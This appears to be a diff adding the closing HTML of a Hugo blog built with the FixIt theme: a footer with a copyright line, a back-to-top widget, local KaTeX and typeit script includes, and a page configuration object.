+    <div class="footer-container"><div class="footer-line powered">Powered by <a href="https://gohugo.io/" target="_blank" rel="external nofollow noopener noreferrer" title="Hugo 0.136.5">Hugo</a> | Theme - <a href="https://github.com/hugo-fixit/FixIt" target="_blank" rel="external" title="FixIt v0.3.13">FixIt</a>
+        </div><div class="footer-line copyright" itemscope itemtype="http://schema.org/CreativeWork"><i class="fa-regular fa-copyright fa-fw" aria-hidden="true"></i>
+            <span itemprop="copyrightYear">2024 - 2025</span><span class="author" itemprop="copyrightHolder">
+              <a href="Tin10g.github.io">Ting</a></span></div></div>
+  </footer></div><div class="widgets"><div class="fixed-buttons animate__faster d-none"><div class="fixed-button back-to-top" role="button" aria-label="Back to Top"><i class="fa-solid fa-arrow-up fa-fw" aria-hidden="true"></i><span class="variant-numeric d-none">0%</span>
+        </div></div><div id="mask"></div><noscript>
+    <div class="noscript-warning">This website works best with JavaScript enabled.</div>
+  </noscript>
+</div><link rel="preload" href="/lib/katex/katex.min.css" as="style" onload="this.removeAttribute('onload');this.rel='stylesheet'">
+    <noscript><link rel="stylesheet" href="/lib/katex/katex.min.css"></noscript><script src="/lib/sharer/sharer.min.js" async defer></script><script src="/lib/typeit/index.umd.js" defer></script><script src="/lib/katex/katex.min.js" defer></script><script src="/lib/katex/auto-render.min.js" defer></script><script src="/lib/katex/copy-tex.min.js" defer></script><script src="/lib/katex/mhchem.min.js" defer></script><script>window.config={"code":{"copyTitle":"Copy to clipboard","maxShownLines":1000},"comment":{"enable":false},"math":{"delimiters":[{"display":true,"left":"$$","right":"$$"},{"display":true,"left":"\\[","right":"\\]"},{"display":true,"left":"\\begin{equation}","right":"\\end{equation}"},{"display":true,"left":"\\begin{equation*}","right":"\\end{equation*}"},{"display":true,"left":"\\begin{align}","right":"\\end{align}"},{"display":true,"left":"\\begin{align*}","right":"\\end{align*}"},{"display":true,"left":"\\begin{alignat}","right":"\\end{alignat}"},{"display":true,"left":"\\begin{alignat*}","right":"\\end{alignat*}"},{"display":true,"left":"\\begin{gather}","right":"\\end{gather}"},{"display":true,"left":"\\begin{CD}","right":"\\end{CD}"},{"display":false,"left":"$","right":"$"},{"display":false,"left":"\\(","right":"\\)"}],"strict":false},"typeit":{"cursorChar":"|","cursorSpeed":1000,"duration":-1,"loop":false,"speed":100},"version":"v0.3.13"};console.log('Page config:', window.config);</script><script src="/js/theme.min.js" defer></script></body>
+</html>
